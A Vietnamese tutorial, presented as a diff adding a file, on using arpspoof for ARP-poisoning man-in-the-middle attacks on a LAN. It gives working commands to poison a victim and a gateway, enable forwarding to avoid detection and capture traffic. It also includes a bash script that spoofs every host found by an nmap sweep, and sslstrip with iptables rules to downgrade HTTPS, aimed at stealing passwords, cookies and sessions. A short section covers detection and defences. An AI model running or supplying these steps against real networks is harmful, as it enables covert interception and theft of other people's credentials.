@@ -1,0 +1,147 @@
+1. arpspoof là gì?
+
+    arpspoof là công cụ CLI đơn giản, mạnh mẽ, thuộc bộ dsniff cho phép giả mạo (spoof) bảng ARP trong mạng LAN.
+
+    Tấn công ARP poisoning: gửi gói ARP giả tới victim/gateway → ép victim gửi traffic qua attacker → tạo “Man-in-the-Middle” để sniff, chỉnh sửa, hoặc chuyển tiếp traffic (MITM).
+
+2. Cài đặt arpspoof
+A. Ubuntu/Kali/Debian
+
+sudo apt update
+sudo apt install dsniff
+
+    arpspoof là một phần trong gói dsniff (cùng với dsniff, mailsnarf, webmitm…).
+
+3. Lý thuyết ARP spoofing/MITM
+
+    ARP (Address Resolution Protocol): ánh xạ IP <-> MAC address trong LAN
+
+    Bản chất tấn công: attacker gửi gói ARP giả tới victim/gateway, nói "IP gateway là MAC của tôi", "IP victim là MAC của tôi" → mọi traffic chuyển qua attacker → attacker sniff, chỉnh sửa, forward tùy ý.
+
+    Không hoạt động qua router/subnet khác! Chỉ trong cùng LAN.
+
+4. Thực chiến tấn công ARP spoof với arpspoof
+A. Xác định target và gateway
+
+ip a         # Xem IP attacker
+ip route     # Xem default gateway (thường 192.168.1.1)
+arp -a       # Xem bảng ARP hiện tại
+
+    Ví dụ:
+
+        Attacker: 192.168.1.100
+
+        Victim: 192.168.1.50
+
+        Gateway: 192.168.1.1
+
+B. Thực hiện ARP poisoning
+
+    Gửi ARP giả tới victim, nói "gateway là attacker":
+
+sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
+
+Gửi ARP giả tới gateway, nói "victim là attacker":
+
+    sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
+
+    Tip: Mở 2 tab terminal, mỗi tab chạy 1 lệnh ở trên.
+
+C. Bật forwarding để không ngắt Internet của victim
+
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+    Forwarding giúp máy attacker relay packet giữa victim & gateway (tránh bị phát hiện).
+
+D. Bắt packet (sniff) traffic
+
+    Dùng Wireshark/tcpdump:
+
+    sudo wireshark &
+    # Hoặc
+    sudo tcpdump -i eth0 -w arpspoof.pcap
+
+    Dùng dsniff/ettercap để sniff credential, cookie, session tự động.
+
+5. Automation/script hoá attack
+
+    Script tự động ARP spoof toàn mạng (multi-victim):
+
+    #!/bin/bash
+    gateway="192.168.1.1"
+    iface="eth0"
+    for victim in $(nmap -sn 192.168.1.0/24 | grep 'Nmap scan report' | awk '{print $5}' | grep -v "$gateway"); do
+      xterm -hold -e "arpspoof -i $iface -t $victim $gateway" &
+      xterm -hold -e "arpspoof -i $iface -t $gateway $victim" &
+    done
+
+    Hoặc scan victim với netdiscover, arp-scan, sau đó attack chọn lọc.
+
+6. MITM nâng cao: Bẻ khoá HTTPS, inject JS, steal cookie…
+A. Bẻ khoá HTTPS
+
+    Dùng kèm sslstrip (downgrade HTTPS → HTTP):
+
+sudo sslstrip -l 8080
+
+    Đổi iptables để redirect port 80/443 về sslstrip:
+
+    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+B. Inject code/mã độc vào HTTP
+
+    Kết hợp với mitmproxy, ettercap, bettercap để sửa nội dung response, inject JS, redirect phishing.
+
+C. Steal cookie/session
+
+    Dsniff, ettercap, wireshark có thể bắt cookie, session ID HTTP dễ dàng.
+
+7. Phòng chống, phát hiện ARP spoof
+
+    Dùng arpwatch, xarp, netcut để detect ARP poisoning
+
+    Static ARP: cấu hình IP-MAC tĩnh (cho hệ thống nhạy cảm)
+
+    Switch cấu hình port isolation, dynamic ARP inspection
+
+    Luôn dùng HTTPS, VPN (sniff traffic không giải mã được)
+
+    Kiểm tra ARP table:
+
+    arp -a
+
+    Nếu thấy nhiều IP cùng MAC = MITM!
+
+8. Fix lỗi thực tế
+Lỗi	Cách xử lý
+Victim bị mất kết nối mạng	Chưa bật IP forwarding, sai lệnh spoof, firewall chặn
+Không sniff được traffic	Victim dùng HTTPS, dùng VPN, switch thông minh (ARP protect), capture sai interface
+ARP table không thay đổi	Chạy bằng sudo, đúng interface, thử lại với card mạng khác
+Không sniff password	Tất cả dịch vụ dùng HTTPS, cần bẻ khóa ssl, thử sniff cookie/token
+Không gửi được ARP	Máy bị isolate, victim/gateway không trả lời ARP, switch layer 3
+9. So sánh arpspoof với các tool MITM khác
+Tool	Ưu điểm arpspoof	Khác biệt
+arpspoof	Nhỏ, nhanh, đơn giản, script tốt, không GUI	Không auto inject/code, không decode protocol
+ettercap	GUI/TUI, filter, plugin, inject code, auto sniff	Nặng hơn, hơi cồng kềnh
+bettercap	CLI hiện đại, tự động hóa, MITM HTTPS, nhiều module	Yêu cầu học syntax mới, đôi khi bị bug
+mitmproxy	MITM HTTPS, sửa traffic, automation Python	Không tự động ARP spoof, chỉ proxy
+dsniff	Sniff credential auto, packet analyzer	Không auto ARP spoof, chỉ sniff
+Wireshark	Phân tích sâu, decode mọi thứ	Không ARP spoof, chỉ sniff traffic
+10. Tài liệu, link hữu ích
+
+    dsniff/arpspoof official
+
+    PayloadAllTheThings – ARP Poisoning
+
+    Hacktricks – ARP Spoofing
+
+    Bettercap official
+
+    Ettercap official
+
+Tóm tắt nhanh
+
+    arpspoof: tool MITM mạng nội bộ đơn giản, mạnh, dùng cho pentest, sniff password, đánh cắp session, debug, pivot, automation script, bẻ khoá HTTPS (kết hợp sslstrip), inject code (kết hợp mitmproxy, ettercap, bettercap), cực hợp lab CTF và tấn công mạng LAN.
+
+    Nên kết hợp sniff bằng Wireshark/tcpdump/dsniff, automation bằng bash/python, phòng chống bằng static ARP, arpwatch.
+
